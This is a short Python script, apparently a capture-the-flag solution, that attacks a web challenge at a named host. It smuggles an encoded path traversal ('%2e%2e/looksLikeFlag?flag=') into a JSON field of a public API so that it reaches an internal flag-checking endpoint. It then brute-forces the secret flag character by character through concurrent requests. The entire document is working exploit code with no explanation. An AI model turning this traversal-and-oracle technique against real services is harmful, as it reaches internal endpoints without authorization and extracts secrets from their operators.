import httpx
import asyncio
import string


async def checkFlag(client, f):
    resp = await client.post(
        "http://splitline.tw:5000/public_api",
        json={"text": "%2e%2e/looksLikeFlag?flag=" + f},
    )
    return resp.json()["looksLikeFlag"]


async def main():
    async with httpx.AsyncClient(http2=True) as client:
        prefix = "FLAG{"
        chs = "_}" + string.ascii_lowercase + string.digits
        while not prefix.endswith("}"):
            results = await asyncio.gather(
                *[checkFlag(client, prefix + c) for c in chs]
            )
            for c, r in zip(chs, results):
                if r:
                    prefix += c
            print(prefix)


asyncio.run(main())
